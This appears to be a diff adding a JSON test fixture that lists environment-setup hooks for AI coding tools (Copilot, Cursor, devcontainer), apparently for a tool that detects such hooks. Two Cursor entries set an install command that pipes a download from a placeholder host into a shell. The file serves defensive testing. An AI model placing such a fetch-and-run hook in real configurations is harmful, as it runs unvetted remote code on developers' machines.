@@ -1,0 +1,52 @@
+[
+ {
+  "harness": "copilot",
+  "scope": "repo",
+  "path": ".github/workflows/copilot-setup-steps.yml",
+  "sha256": "",
+  "kind": "env-setup",
+  "payload": {
+   "setting": "step",
+   "job": "copilot-setup-steps",
+   "run": 1
+  }
+ },
+ {
+  "harness": "cursor",
+  "scope": "repo",
+  "path": ".cursor/environment.json",
+  "sha256": "",
+  "kind": "env-setup",
+  "payload": {
+   "setting": "install",
+   "value": {
+    "command": "curl https://x.example.invalid | sh"
+   }
+  }
+ },
+ {
+  "harness": "devcontainer",
+  "scope": "repo",
+  "path": ".devcontainer/devcontainer.json",
+  "sha256": "",
+  "kind": "env-setup",
+  "payload": {
+   "setting": "postCreateCommand",
+   "value": {
+    "x": 1
+   },
+   "form": "other"
+  }
+ },
+ {
+  "harness": "cursor",
+  "scope": "user",
+  "path": "~/.cursor/environment.json",
+  "sha256": "",
+  "kind": "env-setup",
+  "payload": {
+   "setting": "install",
+   "value": "curl https://x.example.invalid | sh"
+  }
+ }
+]
